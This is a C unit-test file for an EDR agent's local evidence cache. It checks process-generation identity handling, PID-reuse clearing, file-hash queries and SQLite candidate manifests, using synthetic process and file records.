static void test_unknown_to_bound_generation_clears_provisional_metadata(void) {
  const uint32_t pid = 96202u;
  const uint64_t generation_b = 0x96212u;
  struct timespec ts;
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  EdrBehaviorRecord unknown_a;
  init_record(&unknown_a, EDR_EVENT_PROCESS_CREATE);
  unknown_a.pid = pid; unknown_a.event_time_ns = base - 1000000LL;
  snprintf(unknown_a.endpoint_id, sizeof(unknown_a.endpoint_id), "ep-unknown-bound");
  snprintf(unknown_a.process_name, sizeof(unknown_a.process_name), "unknown-a.exe");
  snprintf(unknown_a.exe_path, sizeof(unknown_a.exe_path), "C:\\Unknown-A.exe");
  snprintf(unknown_a.cmdline, sizeof(unknown_a.cmdline), "unknown-a.exe --secret");
  snprintf(unknown_a.parent_name, sizeof(unknown_a.parent_name), "unknown-parent");
  edr_local_evidence_cache_observe_process(&unknown_a);
  assert(put_generation(pid, 0u, "b-sparse.exe", "", "", "", (uint64_t)base,
                        generation_b) == 0);
  EdrBehaviorRecord b;
  init_record(&b, EDR_EVENT_PROCESS_CREATE);
  b.pid = pid; b.event_time_ns = base + 1000000LL;
  set_record_generation(&b, generation_b);
  snprintf(b.endpoint_id, sizeof(b.endpoint_id), "ep-unknown-bound");
  snprintf(b.process_name, sizeof(b.process_name), "b-sparse.exe");
  edr_local_evidence_cache_observe_process(&b);
  EdrBehaviorRecord hit;
  init_record(&hit, EDR_EVENT_NET_CONNECT);
  hit.pid = pid; hit.event_time_ns = base + 2000000LL;
  set_record_generation(&hit, generation_b);
  snprintf(hit.endpoint_id, sizeof(hit.endpoint_id), "ep-unknown-bound");
  edr_local_evidence_cache_enrich_behavior(&hit);
  assert(strcmp(hit.process_name, "b-sparse.exe") == 0);
  assert(!hit.exe_path[0] && !hit.cmdline[0] && !hit.parent_name[0] &&
         !hit.parent_path[0] && !hit.username[0] && !hit.user_sid[0]);
  EdrEvidenceCacheStatus st;
  edr_local_evidence_cache_get_status(&st);
  assert(st.generation_resets >= 1u);
  edr_pt_cache_shutdown();
  edr_local_evidence_cache_close();
}

static void test_parent_only_nonprocess_record_does_not_create_process_slot(void) {
  EdrEvidenceCacheStatus before;
  EdrEvidenceCacheStatus after;
  EdrBehaviorRecord r;
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  init_record(&r, EDR_EVENT_FILE_DELETE);
  r.pid = 96203u;
  r.ppid = 4u;
  r.event_time_ns = 1779340000000000000LL;
  r.process_start_key = 0x96203u;
  r.process_creation_filetime_100ns = 133801632000096203ULL;
  snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-parent-only");
  snprintf(r.parent_name, sizeof(r.parent_name), "System");
  edr_local_evidence_cache_get_status(&before);
  edr_local_evidence_cache_observe_process(&r);
  edr_local_evidence_cache_get_status(&after);
  assert(after.process_slots_used == before.process_slots_used);
  edr_local_evidence_cache_close();
}

static void test_file_sha256_query_uses_file_evidence_cache(void) {
#if defined(EDR_HAVE_SQLITE)
  const char *db = "rtq_file_hash_cache_test.sqlite";
  const char *hash = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  const char *miss = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
  (void)remove(db);
  (void)remove("rtq_file_hash_cache_test.sqlite-wal");
  (void)remove("rtq_file_hash_cache_test.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_FILE_WRITE);
  r.pid = 5151u;
  r.priority = 3u;
  snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-hash-1");
  snprintf(r.file_path, sizeof(r.file_path), "C:\\Users\\Public\\dropper.exe");
  snprintf(r.exe_hash, sizeof(r.exe_hash), "%s", hash);
  snprintf(r.detection_context, sizeof(r.detection_context), "{\"priority\":\"P1\"}");
  edr_local_evidence_cache_record_behavior(&r);

  char rows[4096];
  uint32_t returned = 0;
  uint32_t scanned = 0;
  int truncated = 0;
  assert(edr_local_evidence_cache_query_file_hash_json(hash, "", ".exe", 10u, rows,
                                                        sizeof(rows), &returned, &scanned,
                                                        &truncated) == 0);
  assert(truncated == 0);
  assert(returned == 1u);
  assert(scanned >= 1u);
  assert(strstr(rows, "\"source\":\"file_evidence\"") != NULL);
  assert(strstr(rows, "\"cache_hit\":true") != NULL);
  assert(strstr(rows, "dropper.exe") != NULL);
  assert(strstr(rows, hash) != NULL);

  char tiny_rows[96];
  returned = 99u;
  scanned = 0u;
  truncated = 0;
  assert(edr_local_evidence_cache_query_file_hash_json(hash, "", ".exe", 10u, tiny_rows,
                                                        sizeof(tiny_rows), &returned, &scanned,
                                                        &truncated) == 0);
  assert(truncated == 1);
  assert(returned == 0u);
  assert(strcmp(tiny_rows, "[]") == 0);

  returned = 99u;
  scanned = 99u;
  truncated = 0;
  assert(edr_local_evidence_cache_query_file_hash_json(miss, "", ".exe", 10u, rows,
                                                        sizeof(rows), &returned, &scanned,
                                                        &truncated) == 0);
  assert(returned == 0u);
  assert(strcmp(rows, "[]") == 0);

  char qout[8192];
  char payload[256];
  snprintf(payload, sizeof(payload), "{\"file_sha256\":\"%s\",\"file_ext\":\".exe\"}", hash);
  assert(edr_local_evidence_cache_query_json(payload, qout, sizeof(qout)) == 0);
  assert(strstr(qout, "\"rows_returned\":1") != NULL);
  assert(strstr(qout, "\"source\":\"file_evidence\"") != NULL);

  snprintf(payload, sizeof(payload), "{\"file_sha256\":\"%s\",\"file_ext\":\".dll\"}", hash);
  assert(edr_local_evidence_cache_query_json(payload, qout, sizeof(qout)) == 0);
  assert(strstr(qout, "\"rows_returned\":0") != NULL);

  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("rtq_file_hash_cache_test.sqlite-wal");
  (void)remove("rtq_file_hash_cache_test.sqlite-shm");
#endif
}

#if defined(EDR_HAVE_SQLITE)
static void test_candidate_structured_evidence_and_durable_identity(void) {
  const char *db_path = "local_evidence_cache_structured_evidence.sqlite";
  const char *hash =
      "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
  struct timespec ts;
  EdrBehaviorRecord r;
  EdrBehaviorRecord lower_identity;
  EdrBehaviorRecord reused_pid;
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  char candidate_id[160];
  char manifest_raw[16384];
  char process_tree[8192];
  cJSON *manifest = NULL;
  cJSON *command = NULL;
  cJSON *identity = NULL;
  cJSON *artifact = NULL;
  cJSON *signature = NULL;

  cleanup_test_sqlite_path(db_path);
  assert(edr_local_evidence_cache_open(db_path, 8u, 24u) == 0);
  init_record(&r, EDR_EVENT_PROCESS_CREATE);
  r.priority = 3u;
  r.pid = 75201u;
  r.ppid = 400u;
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  r.event_time_ns = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  set_record_generation(&r, UINT64_C(0x75201));
  snprintf(r.event_id, sizeof(r.event_id), "structured-evidence-source");
  snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-structured-evidence");
  snprintf(r.process_name, sizeof(r.process_name), "powershell.exe");
  snprintf(r.exe_path, sizeof(r.exe_path),
           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
  snprintf(r.cmdline, sizeof(r.cmdline),
           "powershell.exe -NoProfile -File \"C:\\Ops\\Maintenance Script.ps1\"");
  snprintf(r.exe_hash, sizeof(r.exe_hash), "%s", hash);
  snprintf(r.username, sizeof(r.username), "operator");
  snprintf(r.domain, sizeof(r.domain), "CONTOSO");
  snprintf(r.user_sid, sizeof(r.user_sid), "S-1-5-21-1000");
  snprintf(r.logon_id, sizeof(r.logon_id), "0x1234");
  snprintf(r.identity_source, sizeof(r.identity_source), "target_4688");
  snprintf(r.identity_quality, sizeof(r.identity_quality), "target_4688");
  snprintf(r.process_generation_source, sizeof(r.process_generation_source),
           "target_live_telemetry");
  snprintf(r.source_completeness, sizeof(r.source_completeness), "COMPLETE");
  snprintf(r.detection_context, sizeof(r.detection_context),
           "{\"priority\":\"P0\",\"evidence\":{\"signature\":{"
           "\"status\":\"verified\",\"signer\":\"Contoso Code Signing\","
           "\"thumbprint\":\"ABCD\"}}}");
  edr_local_evidence_cache_record_behavior(&r);
  lower_identity = r;
  lower_identity.event_time_ns++;
  snprintf(lower_identity.event_id, sizeof(lower_identity.event_id),
           "structured-evidence-lower-identity-source");
  snprintf(lower_identity.username, sizeof(lower_identity.username), "creator");
  snprintf(lower_identity.user_sid, sizeof(lower_identity.user_sid),
           "S-1-5-21-9999");
  snprintf(lower_identity.identity_source,
           sizeof(lower_identity.identity_source), "creator_fallback");
  snprintf(lower_identity.identity_quality,
           sizeof(lower_identity.identity_quality), "creator_fallback");
  edr_local_evidence_cache_record_behavior(&lower_identity);
  edr_local_evidence_cache_close();

  sqlite_candidate_id_for_source_event(db_path, r.event_id, candidate_id,
                                       sizeof(candidate_id));
  sqlite_bundle_manifest_for_source_event(db_path, r.event_id, manifest_raw,
                                          sizeof(manifest_raw));
  manifest = cJSON_Parse(manifest_raw);
  assert(manifest != NULL);
  command = cJSON_GetObjectItemCaseSensitive(manifest, "command");
  identity = cJSON_GetObjectItemCaseSensitive(manifest, "identity");
  artifact = cJSON_GetObjectItemCaseSensitive(manifest, "artifact");
  signature = cJSON_IsObject(artifact)
                  ? cJSON_GetObjectItemCaseSensitive(artifact, "signature")
                  : NULL;
  assert(cJSON_IsObject(command) && cJSON_IsObject(identity) &&
         cJSON_IsObject(artifact) && cJSON_IsObject(signature));
  assert(strcmp(cJSON_GetObjectItemCaseSensitive(command, "script_path")->valuestring,
                "C:\\Ops\\Maintenance Script.ps1") == 0);
  assert(strstr(cJSON_GetObjectItemCaseSensitive(command, "normalized")->valuestring,
                "-file c:/ops/maintenance script.ps1") != NULL);
  assert(strcmp(cJSON_GetObjectItemCaseSensitive(identity, "user_sid")->valuestring,
                "S-1-5-21-1000") == 0);
  assert(strcmp(cJSON_GetObjectItemCaseSensitive(artifact, "sha256")->valuestring,
                hash) == 0);
  assert(strcmp(cJSON_GetObjectItemCaseSensitive(signature, "status")->valuestring,
                "verified") == 0);
  cJSON_Delete(manifest);

  assert(sqlite3_open_v2(db_path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(
             db,
             "SELECT normalized_command,script_path,exe_hash,username,user_sid,"
             "identity_source,identity_quality FROM p0_candidates WHERE candidate_id=?;",
             -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
  assert(sqlite3_step(stmt) == SQLITE_ROW);
  assert(strstr((const char *)sqlite3_column_text(stmt, 0),
                "-file c:/ops/maintenance script.ps1") != NULL);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 1),
                "C:\\Ops\\Maintenance Script.ps1") == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 2), hash) == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 3), "operator") == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 4), "S-1-5-21-1000") == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 5), "target_4688") == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 6), "target_4688") == 0);
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);

  assert(edr_local_evidence_cache_open(db_path, 8u, 24u) == 0);
  assert(edr_local_evidence_cache_process_tree_json(
             r.pid, r.endpoint_id, process_tree, sizeof(process_tree)) == 0);
  assert(strstr(process_tree, "\"username\":\"operator\"") != NULL);
  assert(strstr(process_tree, "\"user_sid\":\"S-1-5-21-1000\"") != NULL);
  assert(strstr(process_tree, "\"identity_quality\":\"target_4688\"") != NULL);
  assert(strstr(process_tree, hash) != NULL);

  /* A durable identity belongs to one process generation, not the numeric
   * PID. A newer generation with no identity must clear the old subject. */
  reused_pid = r;
  reused_pid.event_time_ns += 2;
  set_record_generation(&reused_pid, UINT64_C(0x75202));
  snprintf(reused_pid.event_id, sizeof(reused_pid.event_id),
           "structured-evidence-reused-pid");
  reused_pid.username[0] = '\0';
  reused_pid.domain[0] = '\0';
  reused_pid.user_sid[0] = '\0';
  reused_pid.logon_id[0] = '\0';
  reused_pid.identity_source[0] = '\0';
  reused_pid.identity_quality[0] = '\0';
  reused_pid.exe_hash[0] = '\0';
  edr_local_evidence_cache_record_behavior(&reused_pid);
  assert(edr_local_evidence_cache_process_tree_json(
             reused_pid.pid, reused_pid.endpoint_id, process_tree,
             sizeof(process_tree)) == 0);
  assert(strstr(process_tree, "\"process_start_key\":\"479746\"") != NULL);
  assert(strstr(process_tree, "operator") == NULL);
  assert(strstr(process_tree, "S-1-5-21-1000") == NULL);
  assert(strstr(process_tree, hash) == NULL);
  edr_local_evidence_cache_close();
  cleanup_test_sqlite_path(db_path);
}
#endif

int main(void) {
  test_checknetisolation_standard_low_risk_is_not_candidate();
  test_checknetisolation_high_risk_port_is_candidate();
  test_checknetisolation_p1_context_is_candidate();
  test_weak_file_event_is_not_candidate();
  test_weak_file_event_p1_context_is_candidate();
  test_high_signal_process_is_candidate();
  test_command_evidence_normalization_and_script_path();
  test_nonstandard_checknetisolation_path_not_suppressed_by_p1_noise();
  test_behavior_summary_flush_coalesced_events();
  test_behavior_summary_below_threshold_no_emit();
  test_identity_status_counter_basics();
#if defined(EDR_HAVE_SQLITE)
  test_candidate_commit_failure_leaves_no_dedupe_or_context_state();
  test_context_write_budget_cannot_starve_later_candidate();
  test_candidate_enrichment_reuses_stable_fallback_under_context_pressure();
  test_candidate_fallback_preserves_path_and_generation_boundaries();
  test_candidate_known_to_unknown_keeps_generation_and_completeness();
  test_candidate_distinct_source_ids_bridge_only_known_to_unknown();
  test_candidate_source_generation_presence_ablation();
  test_candidate_provider_provenance_semantic_ablation();
  test_candidate_cross_provider_snapshot_and_provenance_converge();
  test_candidate_dedupe_rejection_reason_observability();
  test_candidate_completeness_monotonically_upgrades();
  test_candidate_reuse_requires_generation_and_full_semantics();
  test_process_cache_generation_migration_and_restart_safe_rtq();
  test_snapshot_generation_persists_candidate_manifests_and_rtq();
  test_context_generation_multicandidate_and_artifact_identity();
  test_context_manifest_utf8_backslash_and_invalid_rejection();
  test_context_manifest_32_maximum_ring_items_persist();
  test_candidate_structured_evidence_and_durable_identity();
#if !defined(_WIN32)
  test_concurrent_cache_lifecycle_snapshot_and_queries();
  test_mutex_lock_observability_contract();
#endif
#endif
  test_identity_generation_match_delta();
  test_sid_only_identity_enriches_same_generation();
  test_unknown_generation_identity_never_survives_to_later_kernel_generation();
  test_security_4688_identity_none_is_not_lifecycle_authoritative();
  test_known_generation_rejects_late_and_zero_time_identity_updates();
  test_identity_generation_mismatch_and_quality_order();
  test_kernel_generation_a_to_b_resets_cached_identity_once();
  test_delayed_generation_mismatch_withholds_all_process_enrichment();
  test_unknown_to_bound_generation_clears_provisional_metadata();
  test_parent_only_nonprocess_record_does_not_create_process_slot();
  test_file_sha256_query_uses_file_evidence_cache();
  puts("test_local_evidence_cache_candidate: ok");
  return 0;
}
